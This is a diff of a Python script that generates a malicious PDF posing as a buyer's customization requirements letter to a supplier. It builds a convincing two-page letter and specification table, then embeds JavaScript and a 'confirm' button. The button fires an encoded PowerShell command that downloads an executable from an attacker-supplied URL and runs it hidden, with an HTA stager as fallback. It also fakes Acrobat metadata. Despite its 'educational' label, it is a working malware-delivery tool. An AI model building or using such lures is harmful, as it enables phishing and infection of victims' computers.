@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-V303 "THE SUPPLIER CONFIRMATION" – NO EMAIL PROMPT
+V303 "THE SUPPLIER CONFIRMATION" – REPORTLAB + PIKEPDF HYBRID (FINAL)
 ================================================================================
 (c) 2026 The Architect. For Educational and Defensive Research Only.
 ================================================================================
@@ -16,8 +16,13 @@ import string
 import argparse
 import datetime
 import logging
+import tempfile
+from reportlab.lib.pagesizes import A4
+from reportlab.pdfgen import canvas
+from reportlab.lib import colors
+from reportlab.platypus import Table, TableStyle
 import pikepdf
-from pikepdf import String, Array, Stream, Page
+from pikepdf import String, Array, Dictionary, Name, Stream
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger("V303_SUPPLIER_CONFIRMATION")
@@ -46,7 +51,7 @@ End Sub
 </script></head><body></body></html>'''
 
 def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, supplier, product, version, button_label):
-    # Primary PowerShell (ms-powershell URI)
+    # ------ Prepare payloads ------
     ps_cmd = (
         f'$u="{exe_url}";'
         f'$p="$env:TEMP\\{os.path.basename(exe_url)}";'
@@ -56,13 +61,12 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         'if(Test-Path $p){Start-Process $p -WindowStyle Hidden}'
     )
     enc_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode('ascii')
-
     exe_name = os.path.basename(exe_url) if os.path.basename(exe_url) else f"{random_str(4)}.exe"
     hta_content = generate_hta_stager(exe_url, exe_name)
     hta_b64 = base64.b64encode(hta_content.encode('utf-8')).decode('ascii')
     hta_filename = f"{random_str(4)}.hta"
 
-    # JavaScript (no email prompt, includes base64 decoder)
+    # ------ JavaScript (document‑level) ------
     js_code = f"""
     function b64Decode(data) {{
         var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -165,170 +169,187 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
     } catch(e) {}
     """
 
-    # Build PDF
-    pdf = pikepdf.new()
+    # ------ Step 1: Build base PDF with reportlab ------
+    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
+        base_pdf_path = tmp.name
 
-    # Fonts – plain dicts (no Dictionary/Name)
-    helv = pdf.make_indirect({
-        "/Type": "/Font",
-        "/Subtype": "/Type1",
-        "/BaseFont": "/Helvetica"
-    })
-    helv_bold = pdf.make_indirect({
-        "/Type": "/Font",
-        "/Subtype": "/Type1",
-        "/BaseFont": "/Helvetica-Bold"
-    })
-    font_res = pdf.make_indirect({
-        "/Helv": helv,
-        "/HelvBold": helv_bold
-    })
-    resources = pdf.make_indirect({"/Font": font_res})
+    c = canvas.Canvas(base_pdf_path, pagesize=A4)
+    width, height = A4
+    margin = 50
+
+    # ----- Page 1 -----
+    # Header bar
+    c.setFillColor(colors.HexColor("#0a1a33"))
+    c.rect(0, height-20, width, 5, fill=1)
+
+    # Buyer box
+    c.setFillColor(colors.HexColor("#d9e2ef"))
+    c.rect(margin, height-40, 120, 30, fill=1, stroke=1)
+    c.setFillColor(colors.HexColor("#0a1a33"))
+    c.setFont("Helvetica-Bold", 12)
+    c.drawString(margin+5, height-30, buyer[:15])
+
+    # Secured badge
+    c.setFillColor(colors.HexColor("#d9e2ef"))
+    c.rect(width-margin-100, height-45, 90, 25, fill=1, stroke=1)
+    c.setFillColor(colors.HexColor("#0a1a33"))
+    c.setFont("Helvetica-Bold", 8)
+    c.drawString(width-margin-70, height-35, "Secured")
+
+    # Title
+    c.setFillColor(colors.black)
+    c.setFont("Helvetica-Bold", 24)
+    c.drawString(margin, height-100, "Customization Requirements Specification")
+
+    # Body
+    c.setFont("Helvetica", 12)
+    c.drawString(margin, height-150, f"Dear {supplier} Team,")
+    c.setFont("Helvetica", 11)
+    y = height-180
+    lines = [
+        "We have finalized our customization requirements for the product. Please find",
+        "the detailed specifications on the next page. Kindly review and confirm your",
+        "ability to meet these requirements by clicking the button below.",
+        "We look forward to your confirmation."
+    ]
+    for line in lines:
+        c.drawString(margin, y, line)
+        y -= 15
+    y -= 10
 
     date_str = datetime.datetime.now().strftime("%B %d, %Y")
     doc_no = f"REQ-{random_str(6).upper()}"
     expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%B %d, %Y")
 
-    # Page 1: Cover letter + button
-    page1 = pdf.add_blank_page()
-    page1.MediaBox = [0, 0, 595, 842]
-    ops1 = []
-    ops1.append("0.95 0.97 1.0 rg 0 0 595 842 re f")
-    ops1.append("0.1 0.25 0.5 rg 0 750 595 2 re f")
-    ops1.append("0.85 0.9 0.95 rg 40 775 120 40 re f")
-    ops1.append("0.1 0.25 0.5 rg 40 775 120 40 re S")
-    ops1.append("BT /HelvBold 12 Tf 0.1 0.25 0.5 rg")
-    ops1.append(f"1 0 0 1 50 795 Tm ({buyer[:15]}) Tj ET")
-    ops1.append("0.85 0.9 0.95 rg 460 770 100 30 re f")
-    ops1.append("0.1 0.3 0.6 rg 460 770 100 30 re S")
-    ops1.append("BT /HelvBold 8 Tf 0.1 0.3 0.6 rg")
-    ops1.append("1 0 0 1 470 785 Tm (Secured) Tj ET")
-    ops1.append("BT /HelvBold 24 Tf 0 0 0 rg")
-    ops1.append("1 0 0 1 50 680 Tm (Customization Requirements Specification) Tj ET")
-    ops1.append("BT /Helv 12 Tf 0 0 0 rg")
-    ops1.append(f"1 0 0 1 50 620 Tm (Dear {supplier} Team,) Tj ET")
-    ops1.append("BT /Helv 11 Tf")
-    ops1.append("1 0 0 1 50 590 Tm (We have finalized our customization requirements for the product. Please find) Tj ET")
-    ops1.append("1 0 0 1 50 575 Tm (the detailed specifications on the next page. Kindly review and confirm your) Tj ET")
-    ops1.append("1 0 0 1 50 560 Tm (ability to meet these requirements by clicking the button below.) Tj ET")
-    ops1.append("1 0 0 1 50 545 Tm (We look forward to your confirmation.) Tj ET")
-    ops1.append("BT /HelvBold 11 Tf 0.1 0.25 0.5 rg")
-    ops1.append(f"1 0 0 1 50 500 Tm (Document No.: {doc_no}) Tj ET")
-    ops1.append("BT /Helv 11 Tf 0 0 0 rg")
-    ops1.append(f"1 0 0 1 50 480 Tm (Date: {date_str}) Tj ET")
-    ops1.append(f"1 0 0 1 50 460 Tm (Product: {product} v{version}) Tj ET")
-    ops1.append(f"1 0 0 1 50 440 Tm (Response Due: {expiry}) Tj ET")
-    ops1.append("BT /Helv 8 Tf 0.3 0.3 0.3 rg")
-    ops1.append("1 0 0 1 50 50 Tm (This document contains proprietary information. Please confirm receipt and compliance.) Tj ET")
-    content1 = pdf.make_indirect(Stream(pdf, "\n".join(ops1).encode('utf-8')))
-    page1.Contents = content1
-    page1.Resources = resources
-
-    # Button annotation (plain dict)
-    button = {
-        "/Type": "/Annot",
-        "/Subtype": "/Widget",
-        "/FT": "/Btn",
-        "/T": String("ConfirmButton"),
-        "/Rect": [100, 330, 495, 390],
-        "/F": 4,
-        "/BS": {"/S": "/S", "/W": 2, "/BC": [0.2, 0.5, 0.7]},
-        "/MK": {"/BG": [0.15, 0.45, 0.7], "/CA": String(button_label)},
-        "/AA": {
-            "/U": {"/S": "/JavaScript", "/JS": String("this.doc.trigger();")}
-        }
-    }
-    page1.Annots = pdf.make_indirect(Array([button]))
-
-    # Page 2: Requirements table
-    page2 = pdf.add_blank_page()
-    page2.MediaBox = [0, 0, 595, 842]
-    ops2 = []
-    ops2.append("0.95 0.97 1.0 rg 0 0 595 842 re f")
-    ops2.append("0.1 0.25 0.5 rg 0 750 595 2 re f")
-    ops2.append("BT /HelvBold 20 Tf 0 0 0 rg")
-    ops2.append("1 0 0 1 50 700 Tm (Detailed Customization Requirements) Tj ET")
-    ops2.append("BT /Helv 11 Tf 0.3 0.3 0.3 rg")
-    ops2.append(f"1 0 0 1 50 680 Tm (Document No.: {doc_no}  |  Date: {date_str}) Tj ET")
-    items = [
-        ("Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"),
-        ("Specifications", "Material: ABS plastic, UL94 V-0 rated", "Required", "High"),
-        ("Specifications", "Color: Pantone 300C (blue), matte finish", "Required", "Medium"),
-        ("Quality", "ISO 9001:2015 certification", "Required", "High"),
-        ("Quality", "100% functional test before shipment", "Required", "High"),
-        ("Quality", "Acceptable defect rate ≤ 0.5%", "Required", "Medium"),
-        ("Packaging", "Individual blister packaging with anti-static bag", "Required", "Medium"),
-        ("Packaging", "Master carton: 50 units per carton, weight ≤ 15kg", "Required", "Low"),
-        ("Delivery", "FOB Shanghai, Incoterms 2020", "Required", "High"),
-        ("Delivery", "Lead time: 30 days after PO confirmation", "Required", "High"),
-        ("Compliance", "RoHS and REACH compliance certificates", "Required", "High"),
-        ("Compliance", "Conflict-free minerals declaration", "Required", "Medium"),
-    ]
-    y = 640
-    cols = [50, 180, 360, 470]
-    ops2.append("1 1 1 rg 40 330 530 310 re f")
-    ops2.append("0.8 0.8 0.8 rg 40 330 530 310 re S")
-    ops2.append("0.1 0.25 0.5 rg 40 640 530 20 re f")
-    ops2.append("1 1 1 rg BT /HelvBold 10 Tf")
-    headers = ["Category", "Requirement", "Status", "Priority"]
-    for i, h in enumerate(headers):
-        ops2.append(f"1 0 0 1 {cols[i]+5} 645 Tm ({h}) Tj")
-    ops2.append("ET")
+    c.setFont("Helvetica-Bold", 11)
+    c.setFillColor(colors.HexColor("#0a1a33"))
+    c.drawString(margin, y, f"Document No.: {doc_no}")
     y -= 20
-    for idx, (cat, desc, status, prio) in enumerate(items):
-        if idx % 2 == 0:
-            ops2.append("0.96 0.97 0.99 rg")
-        else:
-            ops2.append("1 1 1 rg")
-        ops2.append(f"40 {y-2} 530 18 re f")
-        ops2.append("0.85 0.85 0.85 rg 40 {y-2} 530 18 re S")
-        ops2.append("BT /Helv 9 Tf 0 0 0 rg")
-        ops2.append(f"1 0 0 1 {cols[0]} {y} Tm ({cat}) Tj")
-        desc_short = desc if len(desc) <= 40 else desc[:37] + "..."
-        ops2.append(f"1 0 0 1 {cols[1]} {y} Tm ({desc_short}) Tj")
-        if status == "Required":
-            ops2.append("0.8 0.1 0.1 rg")
-        else:
-            ops2.append("0.1 0.6 0.1 rg")
-        ops2.append(f"1 0 0 1 {cols[2]} {y} Tm ({status}) Tj")
-        ops2.append("0 0 0 rg")
-        ops2.append(f"1 0 0 1 {cols[3]} {y} Tm ({prio}) Tj")
-        ops2.append("ET")
-        y -= 18
-    ops2.append("BT /Helv 8 Tf 0.3 0.3 0.3 rg")
-    ops2.append("1 0 0 1 50 50 Tm (Please confirm your ability to meet these requirements by clicking the button on page 1.) Tj ET")
-    content2 = pdf.make_indirect(Stream(pdf, "\n".join(ops2).encode('utf-8')))
-    page2.Contents = content2
-    page2.Resources = resources
+    c.setFont("Helvetica", 11)
+    c.setFillColor(colors.black)
+    c.drawString(margin, y, f"Date: {date_str}")
+    y -= 20
+    c.drawString(margin, y, f"Product: {product} v{version}")
+    y -= 20
+    c.drawString(margin, y, f"Response Due: {expiry}")
 
-    # Attach JavaScript
-    pdf.Root["/Names"] = pdf.make_indirect({
-        "/JavaScript": pdf.make_indirect({
-            "/Names": Array([
+    # Footer
+    c.setFont("Helvetica", 8)
+    c.setFillColor(colors.gray)
+    c.drawString(margin, 30, "This document contains proprietary information. Please confirm receipt and compliance.")
+
+    # ----- Page 2 -----
+    c.showPage()
+    c.setFont("Helvetica-Bold", 20)
+    c.setFillColor(colors.black)
+    c.drawString(margin, height-50, "Detailed Customization Requirements")
+    c.setFont("Helvetica", 11)
+    c.setFillColor(colors.gray)
+    c.drawString(margin, height-70, f"Document No.: {doc_no}  |  Date: {date_str}")
+
+    # Table data
+    data = [
+        ["Category", "Requirement", "Status", "Priority"],
+        ["Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"],
+        ["Specifications", "Material: ABS plastic, UL94 V-0 rated", "Required", "High"],
+        ["Specifications", "Color: Pantone 300C (blue), matte finish", "Required", "Medium"],
+        ["Quality", "ISO 9001:2015 certification", "Required", "High"],
+        ["Quality", "100% functional test before shipment", "Required", "High"],
+        ["Quality", "Acceptable defect rate ≤ 0.5%", "Required", "Medium"],
+        ["Packaging", "Individual blister packaging with anti-static bag", "Required", "Medium"],
+        ["Packaging", "Master carton: 50 units per carton, weight ≤ 15kg", "Required", "Low"],
+        ["Delivery", "FOB Shanghai, Incoterms 2020", "Required", "High"],
+        ["Delivery", "Lead time: 30 days after PO confirmation", "Required", "High"],
+        ["Compliance", "RoHS and REACH compliance certificates", "Required", "High"],
+        ["Compliance", "Conflict-free minerals declaration", "Required", "Medium"],
+    ]
+    table = Table(data, colWidths=[80, 200, 60, 60])
+    table.setStyle(TableStyle([
+        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#0a1a33")),
+        ('TEXTCOLOR', (0,0), (-1,0), colors.white),
+        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
+        ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
+        ('FONTSIZE', (0,0), (-1,0), 10),
+        ('BOTTOMPADDING', (0,0), (-1,0), 8),
+        ('BACKGROUND', (0,1), (-1,-1), colors.white),
+        ('GRID', (0,0), (-1,-1), 0.5, colors.gray),
+        ('FONTNAME', (0,1), (-1,-1), 'Helvetica'),
+        ('FONTSIZE', (0,1), (-1,-1), 9),
+        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
+    ]))
+    table.wrapOn(c, width-2*margin, height-200)
+    table.drawOn(c, margin, height-170 - table._height)
+
+    # Footer
+    c.setFont("Helvetica", 8)
+    c.setFillColor(colors.gray)
+    c.drawString(margin, 30, "Please confirm your ability to meet these requirements by clicking the button on page 1.")
+    c.save()
+    logger.info(f"[+] Base PDF generated: {base_pdf_path}")
+
+    # ------ Step 2: Add interactive elements with pikepdf ------
+    pdf = pikepdf.open(base_pdf_path)
+
+    # Add JavaScript name tree
+    pdf.Root[Name("/Names")] = pdf.make_indirect({
+        Name("/JavaScript"): pdf.make_indirect({
+            Name("/Names"): Array([
                 String("trigger"),
-                pdf.make_indirect({"/JS": String(js_code), "/S": "/JavaScript"})
+                pdf.make_indirect({Name("/JS"): String(js_code), Name("/S"): Name("/JavaScript")})
             ])
         })
     })
-    pdf.Root["/OpenAction"] = pdf.make_indirect({
-        "/S": "/JavaScript",
-        "/JS": String(browser_js)
+
+    # OpenAction (browser decoy)
+    pdf.Root[Name("/OpenAction")] = pdf.make_indirect({
+        Name("/S"): Name("/JavaScript"),
+        Name("/JS"): String(browser_js)
     })
 
-    pdf.docinfo["/Title"] = String(f"Customization Requirements – {product} (v{version})")
-    pdf.docinfo["/Author"] = String(buyer)
-    pdf.docinfo["/Creator"] = String("Adobe Acrobat Pro DC")
+    # Button on page 1 (index 0)
+    page1 = pdf.pages[0]
+    button = Dictionary({
+        Name("/Type"): Name("/Annot"),
+        Name("/Subtype"): Name("/Widget"),
+        Name("/FT"): Name("/Btn"),
+        Name("/T"): String("ConfirmButton"),
+        Name("/Rect"): [100, 330, 495, 390],
+        Name("/F"): 4,
+        Name("/BS"): Dictionary({
+            Name("/S"): Name("/S"),
+            Name("/W"): 2,
+            Name("/BC"): [0.2, 0.5, 0.7]
+        }),
+        Name("/MK"): Dictionary({
+            Name("/BG"): [0.15, 0.45, 0.7],
+            Name("/CA"): String(button_label)
+        }),
+        Name("/AA"): Dictionary({
+            Name("/U"): Dictionary({
+                Name("/S"): Name("/JavaScript"),
+                Name("/JS"): String("this.doc.trigger();")
+            })
+        })
+    })
+    if page1.Annots:
+        page1.Annots.append(button)
+    else:
+        page1.Annots = Array([button])
+
+    # Metadata
+    pdf.docinfo[Name("/Title")] = String(f"Customization Requirements – {product} (v{version})")
+    pdf.docinfo[Name("/Author")] = String(buyer)
+    pdf.docinfo[Name("/Creator")] = String("Adobe Acrobat Pro DC")
 
     pdf.save(output_path, compress_streams=False)
-    logger.info(f"[!] PDF generated: {output_path}")
-    logger.info(f"    - Button label: '{button_label}'")
-    logger.info(f"    - Payload primary: ms-powershell URI")
-    logger.info(f"    - Payload fallback: HTA (createDataObject + exportDataObject)")
-    logger.info(f"    - Ultimate fallback: {fallback_url}")
+    logger.info(f"[+] Final PDF saved: {output_path}")
+
+    # Cleanup
+    os.unlink(base_pdf_path)
 
 def main():
-    parser = argparse.ArgumentParser(description="V303 Supplier Confirmation – No Email Prompt")
-    parser.add_argument("-o", "--output", default="v303_supplier_confirmation.pdf", help="Output PDF filename")
+    parser = argparse.ArgumentParser(description="V303 Supplier Confirmation – Hybrid generator")
+    parser.add_argument("-o", "--output", default="requirements.pdf", help="Output PDF filename")
     parser.add_argument("-u", "--url", required=True, help="URL of the final EXE payload")
     parser.add_argument("-f", "--fallback", help="Fallback URL (default: same as -u)")
     parser.add_argument("-b", "--buyer", default="GlobalTech Solutions", help="Buyer company name")
